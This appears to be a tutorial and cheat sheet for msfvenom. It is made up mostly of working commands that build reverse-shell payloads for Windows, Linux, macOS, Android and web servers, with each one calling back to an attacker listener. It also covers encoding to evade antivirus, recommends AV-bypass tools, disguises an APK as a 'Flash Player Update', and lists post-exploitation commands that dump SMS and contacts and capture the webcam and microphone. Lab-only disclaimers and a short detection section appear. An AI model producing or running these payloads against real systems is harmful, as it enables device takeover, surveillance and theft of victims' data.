# 🔥 **What is `msfvenom`?**

`msfvenom` is a payload generator tool that comes with the **Metasploit Framework**.
It combines two older tools:

* **msfpayload** → used to generate shellcode/payloads
* **msfencode** → used to encode/obfuscate payloads

Now both are replaced with **msfvenom** (one command for both tasks).

📌 In short:
👉 `msfvenom` = generate payloads (malicious executables, scripts, DLLs, shellcodes, etc.) + optionally encode them.

---

# ⚙️ **Basic Syntax**

```bash
msfvenom -p <PAYLOAD> [options] <format>
```

### Common Options:

* `-p` → Specify the payload
* `-l payloads` → List all available payloads
* `-f` → Format of output (exe, elf, raw, python, etc.)
* `-a` → Architecture (x86, x64, arm, etc.)
* `--platform` → Windows, Linux, Android, etc.
* `-e` → Encoder to use (to evade detection)
* `-i` → Number of iterations for encoding
* `-b` → Bad characters to avoid (like `\x00`, `\x0a`)
* `-o` → Output file

---

# 📂 **Payload Categories**

You can list payloads like this:

```bash
msfvenom -l payloads
```

Main types:

* **Windows** → `windows/meterpreter/reverse_tcp`
* **Linux** → `linux/x86/meterpreter/reverse_tcp`
* **Android** → `android/meterpreter/reverse_tcp`
* **MacOS** → `osx/x86/shell_reverse_tcp`
* **Web payloads** → `php/meterpreter_reverse_tcp`, `jsp_shell_reverse_tcp`
* **Scripting payloads** → Python, Ruby, PowerShell

---

# 🛠️ **Examples of Usage**

### 1. Windows Reverse Shell (EXE)

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o shell.exe
```

* Generates `shell.exe`
* When victim runs it → reverse Meterpreter session

---

### 2. Linux Reverse Shell (ELF)

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf -o shell.elf
```

---

### 3. Android APK Payload

```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -o evil.apk
```

---

### 4. MacOS Reverse Shell

```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f macho -o shell.macho
```

---

### 5. Web Payloads

* **PHP reverse shell**

```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw -o shell.php
```

* **ASP**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f asp -o shell.asp
```

* **JSP**

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw -o shell.jsp
```

---

### 6. PowerShell Payload

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f psh -o shell.ps1
```

---

### 7. Inject Shellcode into C Program

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f c
```

📌 This will output **C shellcode** which you can paste into exploits.

---

### 8. Avoid Bad Characters

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -b "\x00\x0a\x0d" -f exe -o shell.exe
```

👉 Useful in buffer overflow exploits.

---

### 9. Encoding Payloads (to evade AV)

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe
```

* `-e` = encoder
* `-i` = how many times to encode

---

### 10. List All Encoders

```bash
msfvenom -l encoders
```

---

# 📡 **Handler (Listener) in Metasploit**

After generating a payload, you need a listener:

1. Open `msfconsole`
2. Run:

```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
run
```

Now wait for the victim to execute the payload.

---

# 🎯 **Popular Payloads**

* `windows/meterpreter/reverse_tcp` → Most common reverse shell
* `windows/x64/meterpreter/reverse_https` → More stealthy
* `android/meterpreter/reverse_tcp` → Android backdoor
* `php/meterpreter_reverse_tcp` → Web shell
* `linux/x86/shell_reverse_tcp` → Linux shell

---

# 🚀 **Tips & Best Practices**

* Always set correct `LHOST` (your IP) and `LPORT` (open port)
* Use `reverse_https` payloads → better evasion, works behind firewalls
* Test payloads in a **lab environment only** (VMs, test machines)
* Encode only when needed (encoding can break payloads)
* Pair with **Veil-Evasion** or **Shellter** for AV bypass

  Below are **educational / lab-only examples** of **Android APK payloads using `msfvenom`**, commonly used in **CTFs, test labs (Hack The Box, TryHackMe)**, or **authorized penetration tests**.

> ⚠️ **Use only on devices you own or have explicit permission to test**

---

## 1️⃣ Basic Android Reverse TCP Meterpreter (APK)

**Most common Android payload**

```
msfvenom -p android/meterpreter/reverse_tcp \
LHOST=192.168.1.100 LPORT=4444 \
-o android_basic.apk
```

✔ Creates a malicious APK
✔ When installed & opened → reverse Meterpreter session
✔ Requires Metasploit listener

---

## 2️⃣ Android Reverse HTTPS Meterpreter (More stealthy)

Uses HTTPS instead of raw TCP.

```
msfvenom -p android/meterpreter/reverse_https \
LHOST=example.com LPORT=443 \
-o android_https.apk
```

✔ Better for firewalls
✔ Looks like normal HTTPS traffic
✔ Common in red-team simulations

---

## 3️⃣ Android Reverse HTTP Meterpreter

```
msfvenom -p android/meterpreter/reverse_http \
LHOST=192.168.1.100 LPORT=8080 \
-o android_http.apk
```

✔ Less encrypted
✔ Easier to analyze for blue teams
✔ Useful for learning detection

---

## 4️⃣ Specify APK Name & App Icon (Social Engineering Demo)

```
msfvenom -p android/meterpreter/reverse_tcp \
LHOST=192.168.1.100 LPORT=4444 \
--apk-name "Flash Player Update" \
-o FlashUpdate.apk
```

✔ Demonstrates **APK masquerading**
✔ Often used in awareness training

---

## 5️⃣ Android Bind TCP Payload

Target listens; attacker connects.

```
msfvenom -p android/meterpreter/bind_tcp \
LPORT=5555 \
-o android_bind.apk
```

✔ No callback needed
❌ Less practical (firewalls/NAT)

---

## 6️⃣ Staged vs Stageless Payload

### 🔹 Staged (default)

```
android/meterpreter/reverse_tcp
```

✔ Smaller APK
✔ Downloads stage later

### 🔹 Stageless

```
android/meterpreter_reverse_tcp
```

✔ Entire payload inside APK
✔ Larger file
✔ More reliable in poor networks

---

## 7️⃣ Generate Raw Dalvik Shellcode (Advanced / Research)

```
msfvenom -p android/meterpreter/reverse_tcp \
LHOST=192.168.1.100 LPORT=4444 \
-f raw > android_shellcode.bin
```

✔ Used in exploit dev
✔ Not for normal APK installs

---

## 8️⃣ APK + Metasploit Listener (Required)

After generating APK, you **must** start a handler:

```
msfconsole
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
run
```

---

## 9️⃣ Post-Exploitation (What Android Meterpreter Can Do)

Once session opens:

```
sysinfo
app_list
dump_contacts
dump_sms
geolocate
webcam_snap
record_mic
shell
```

🛑 Many commands require permissions granted by user

---

## 🔵 Blue Team Insight (Detection)

Android payload APKs are often detected by:

* Suspicious permissions
* Known Metasploit signatures
* Network callbacks
* Play Protect

Used heavily in **SOC & malware analysis labs**

---

## 🧪 Common Learning Labs

* Android Emulator + Metasploit
* Genymotion
* Android-x86 VM
* TryHackMe Android rooms

---




---

📌 So, that’s a **complete `msfvenom` guide** — from basics → payloads → encoding → listener setup.

